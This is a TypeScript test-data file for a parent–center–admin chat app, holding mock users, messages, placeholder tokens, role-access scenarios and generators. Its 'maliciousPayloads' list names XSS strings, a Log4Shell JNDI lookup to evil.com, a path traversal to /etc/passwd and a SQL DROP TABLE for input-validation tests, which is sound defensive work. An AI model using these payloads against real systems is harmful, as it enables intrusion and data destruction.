// Test data for chat testing scenarios
export const testData = {
  // Test users for different roles
  users: {
    admin: {
      id: '1',
      name: 'Admin User',
      email: 'admin@example.com',
      role: 'admin' as const,
      avatar: 'http://example.com/avatars/admin.jpg',
    },
    parent1: {
      id: '2',
      name: 'Parent One',
      email: 'parent1@example.com',
      role: 'parent' as const,
      avatar: 'http://example.com/avatars/parent1.jpg',
    },
    parent2: {
      id: '3',
      name: 'Parent Two',
      email: 'parent2@example.com',
      role: 'parent' as const,
      avatar: 'http://example.com/avatars/parent2.jpg',
    },
    center1: {
      id: '4',
      name: 'Center One',
      email: 'center1@example.com',
      role: 'center' as const,
      avatar: 'http://example.com/avatars/center1.jpg',
    },
    center2: {
      id: '5',
      name: 'Center Two',
      email: 'center2@example.com',
      role: 'center' as const,
      avatar: 'http://example.com/avatars/center2.jpg',
    },
  },

  // Mock contacts for different user types
  contacts: [
    {
      id: 2,
      name: 'Parent One',
      email: 'parent1@example.com',
      avatar: 'http://example.com/avatars/parent1.jpg',
      is_online: 1,
    },
    {
      id: 3,
      name: 'Parent Two',
      email: 'parent2@example.com',
      avatar: 'http://example.com/avatars/parent2.jpg',
      is_online: 0,
    },
    {
      id: 4,
      name: 'Center One',
      email: 'center1@example.com',
      avatar: 'http://example.com/avatars/center1.jpg',
      is_online: 1,
    },
  ],

  // Mock messages for testing
  messages: [
    {
      id: 1,
      sender_id: 2,
      receiver_id: 4,
      message: 'Hello from parent to center',
      image: null,
      video_url: null,
      created_at: '2024-01-01T10:00:00Z',
      updated_at: '2024-01-01T10:00:00Z',
      is_read: false,
      is_read_admin: false,
      image_url: null,
      video_url_path: null,
    },
    {
      id: 2,
      sender_id: 4,
      receiver_id: 2,
      message: 'Hello back from center to parent',
      image: null,
      video_url: null,
      created_at: '2024-01-01T10:01:00Z',
      updated_at: '2024-01-01T10:01:00Z',
      is_read: true,
      is_read_admin: false,
      image_url: null,
      video_url_path: null,
    },
    {
      id: 3,
      sender_id: 1,
      receiver_id: 2,
      message: 'Admin message to parent',
      image: null,
      video_url: null,
      created_at: '2024-01-01T10:02:00Z',
      updated_at: '2024-01-01T10:02:00Z',
      is_read: false,
      is_read_admin: true,
      is_admin_message: true,
      image_url: null,
      video_url_path: null,
    },
    {
      id: 4,
      sender_id: 2,
      receiver_id: 4,
      message: 'Message with image',
      image: 'test-image.jpg',
      video_url: null,
      created_at: '2024-01-01T10:03:00Z',
      updated_at: '2024-01-01T10:03:00Z',
      is_read: false,
      is_read_admin: false,
      image_url: 'http://example.com/images/test-image.jpg',
      video_url_path: null,
    },
    {
      id: 5,
      sender_id: 4,
      receiver_id: 2,
      message: 'Message with video',
      image: null,
      video_url: 'http://example.com/videos/test-video.mp4',
      created_at: '2024-01-01T10:04:00Z',
      updated_at: '2024-01-01T10:04:00Z',
      is_read: false,
      is_read_admin: false,
      image_url: null,
      video_url_path: 'http://example.com/videos/test-video.mp4',
    },
  ],

  // Mock admin conversations
  adminConversations: [
    {
      users: {
        user1: {
          id: 2,
          name: 'Parent One',
        },
        user2: {
          id: 4,
          name: 'Center One',
        },
      },
      last_message: {
        id: 2,
        sender_id: 4,
        receiver_id: 2,
        message: 'Hello back from center to parent',
        created_at: '2024-01-01T10:01:00Z',
      },
    },
    {
      users: {
        user1: {
          id: 3,
          name: 'Parent Two',
        },
        user2: {
          id: 5,
          name: 'Center Two',
        },
      },
      last_message: {
        id: 6,
        sender_id: 3,
        receiver_id: 5,
        message: 'Another conversation',
        created_at: '2024-01-01T11:00:00Z',
      },
    },
  ],

  // Mock center parents data
  centerParents: [
    {
      id: 2,
      name: 'Parent One',
      email: 'parent1@example.com',
      phone: '+1234567890',
      address: '123 Main St',
      role: 'parent',
      is_online: 1,
      children: [
        {
          id: 1,
          child_name: 'Child One',
          parent_name: 'Parent One',
          mother_name: 'Mother One',
        },
      ],
    },
    {
      id: 3,
      name: 'Parent Two',
      email: 'parent2@example.com',
      phone: '+1234567891',
      address: '456 Oak Ave',
      role: 'parent',
      is_online: 0,
      children: [
        {
          id: 2,
          child_name: 'Child Two',
          parent_name: 'Parent Two',
          mother_name: 'Mother Two',
        },
      ],
    },
  ],

  // Mock centers for parent data
  centersForParent: [
    {
      id: 4,
      name: 'Center One',
      email: 'center1@example.com',
      phone: '+1234567892',
      role: 'center',
      is_online: 1,
    },
    {
      id: 5,
      name: 'Center Two',
      email: 'center2@example.com',
      phone: '+1234567893',
      role: 'center',
      is_online: 0,
    },
  ],

  // Test tokens for different user types
  tokens: {
    admin: 'admin-jwt-token',
    parent: 'parent-jwt-token',
    center: 'center-jwt-token',
    expired: 'expired-jwt-token',
    invalid: 'invalid-jwt-token',
  },

  // Test scenarios for property-based testing
  scenarios: {
    // Role-based access control scenarios
    validRoleCombinations: [
      { sender: 'admin', receiver: 'parent', allowed: true },
      { sender: 'admin', receiver: 'center', allowed: true },
      { sender: 'parent', receiver: 'center', allowed: true },
      { sender: 'center', receiver: 'parent', allowed: true },
    ],
    invalidRoleCombinations: [
      { sender: 'parent', receiver: 'parent', allowed: false },
      { sender: 'center', receiver: 'center', allowed: false },
    ],

    // Message validation scenarios
    validMessages: [
      'Hello world',
      'Message with emoji 😊',
      'A'.repeat(100), // 100 characters
      'Message with numbers 123',
      'Message with special chars !@#$%',
    ],
    invalidMessages: [
      '', // Empty message
      'A'.repeat(1001), // Too long
      null,
      undefined,
    ],

    // Security test scenarios
    maliciousPayloads: [
      '<script>alert("xss")</script>',
      'javascript:alert("xss")',
      '${jndi:ldap://evil.com/a}',
      '../../../etc/passwd',
      'DROP TABLE messages;',
    ],

    // Performance test scenarios
    performanceScenarios: {
      smallConversation: { messageCount: 10, userCount: 2 },
      mediumConversation: { messageCount: 100, userCount: 5 },
      largeConversation: { messageCount: 1000, userCount: 10 },
      massiveConversation: { messageCount: 10000, userCount: 50 },
    },

    // Network conditions for testing
    networkConditions: [
      { name: 'fast', latency: 50, bandwidth: 1000 },
      { name: 'slow', latency: 500, bandwidth: 100 },
      { name: 'unstable', latency: 1000, bandwidth: 50 },
    ],
  },
};

// Helper functions for generating test data
export const testDataGenerators = {
  // Generate a random user ID
  randomUserId: () => Math.floor(Math.random() * 1000) + 1,

  // Generate a random message
  randomMessage: (length = 50) => {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 ';
    return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
  },

  // Generate a random timestamp
  randomTimestamp: () => new Date(Date.now() - Math.random() * 86400000 * 30).toISOString(),

  // Generate a conversation with specified number of messages
  generateConversation: (messageCount: number, participants: string[]) => {
    const messages = [];
    for (let i = 0; i < messageCount; i++) {
      const senderId = participants[Math.floor(Math.random() * participants.length)];
      const receiverId = participants.find(p => p !== senderId) || participants[0];
      
      messages.push({
        id: i + 1,
        sender_id: parseInt(senderId),
        receiver_id: parseInt(receiverId),
        message: testDataGenerators.randomMessage(),
        image: Math.random() > 0.9 ? 'test-image.jpg' : null,
        video_url: Math.random() > 0.95 ? 'http://example.com/video.mp4' : null,
        created_at: testDataGenerators.randomTimestamp(),
        updated_at: testDataGenerators.randomTimestamp(),
        is_read: Math.random() > 0.5,
        is_read_admin: Math.random() > 0.7,
        image_url: Math.random() > 0.9 ? 'http://example.com/images/test.jpg' : null,
        video_url_path: Math.random() > 0.95 ? 'http://example.com/videos/test.mp4' : null,
      });
    }
    return messages;
  },
};